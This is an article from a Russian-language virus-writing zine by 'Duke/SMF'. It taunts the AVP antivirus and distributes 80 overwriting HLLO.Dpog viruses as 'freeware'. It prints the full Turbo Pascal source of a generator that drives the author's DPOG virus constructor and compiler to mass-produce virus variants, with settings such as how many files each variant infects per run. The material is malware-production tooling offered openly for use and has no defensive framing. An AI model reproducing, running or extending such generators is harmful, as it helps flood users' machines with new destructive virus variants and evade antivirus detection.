Генерируем DPOG-вирусы
(c) by Duke/SMF

   С недавних пор программа AVP стала детектировать мой конструктор
DPOG и один из созданных на нем вирусов. Но видимо Касперский недооценил
способностей конструктора по созданию вирусов, или его не страшат
HLLO-вирусы. Так или иначе, но все прочие DPOG-вирусы программа AVP
удостаивает гордым молчанием. А зря ! Нельзя недооценивать противника !
Поэтому в этом номере я привожу немного вирусов (всего лишь 80 ;)),
созданных мной с помощью конструктора. Также привожу тестовую программу,
которая мне все это многообразие сотворила (правда, пришлось кое-где
ручками длину повписывать, ну да это мелочь). Раз становится традицией
дарить авторам антивирусов десятки (сотни, тысячи - ненужное зачеркнуть)
сконструированных вирусов, то и мне надо внести свой посильный вклад,
дабы не отстать от моды 8) Получите в прилагающемся архиве 80 HLLO.Dpog
вирусов - FreeWare ;)
  А это генератор :

{$M 5000, 0, 5000}
uses dos;
const d1:array[1..3] of char = ('C','E','B');
      e1:array[1..2] of byte = (0,3);
      g1:array[1..2] of char = ('Y','N');
var sc:integer;
    d,e,g,h,i,l :byte;
    Command,st,cf,pf:string;
    f:text;
label not_comp;
begin
writeln('Генератор DPOG вирусов (c) by Duke/SMF');
writeln('Подождите несколько минут...');
Command:=GetEnv('COMSPEC');
sc:=1;
for d:=1 to 3 do
  for e:=1 to 2 do  {от 0 до 3 вирусов поражать за 1 раз}
    for g:=1 to 2 do {}
      for h:=1 to 2 do
        for i:=1 to 2 do
          for l:=1 to 2 do
            begin
            str(sc,st);
            cf:='dpog'+st+'.cfg';
            assign(f,cf);
            rewrite(f);
            writeln(f,'A=Duke/SMF');
            writeln(f,'B=DPOG Demo Virus');
            pf:='dpog'+st+'.pas';
            writeln(f,'C='+pf);
            writeln(f,'D=',d1[d]);
            writeln(f,'E=',e1[e]);
            writeln(f,'F=M$');
            writeln(f,'G=',g1[g]);
            writeln(f,'H=',g1[h]);
            if (i=1) and (d=2) then
              begin
              close(f);
              goto not_comp;
              end
            else writeln(f,'I=',g1[i]);
            writeln(f,'J=This is DPOG demo virus');{. Number ',sc);}
            writeln(f,'J=Created (c) by Duke/SMF');
            writeln(f,'K=');
            writeln(f,'L=',g1[l]);
            close(f);
            exec(Command,'/c dpog.exe '+cf+'>nul');
            exec(Command,'/c tpc.exe '+pf+'>nul');
          {  exec(Command,'/c del '+pf+'>nul');}
            sc:=sc+1;
not_comp:
            end;
writeln('Не забывайте о правильной длине в вирусах !');
end.
